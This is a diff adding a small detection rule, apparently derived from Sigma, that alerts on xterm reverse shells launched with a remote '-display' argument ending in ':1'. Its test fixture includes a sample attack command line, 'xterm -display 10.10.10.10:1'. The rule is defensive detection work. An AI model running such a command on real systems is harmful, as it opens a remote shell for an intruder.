@@ -1,0 +1,16 @@
+name: sigma_xterm_reverse_shell
+mode: alert
+eval: |
+  (
+    e.process_executable.contains("xterm") && e.process_args.contains("-display") && e.process_args.ends_with(":1")
+  )
+tests:
+  - cleartext: "xterm reverse shell ending with :1"
+    process_name: xterm
+    process_executable: /usr/bin/xterm
+    process_args: "xterm -display 10.10.10.10:1"
+    should_match: true
+  - cleartext: "normal ls"
+    process_name: ls
+    process_args: "ls -la"
+    should_match: false
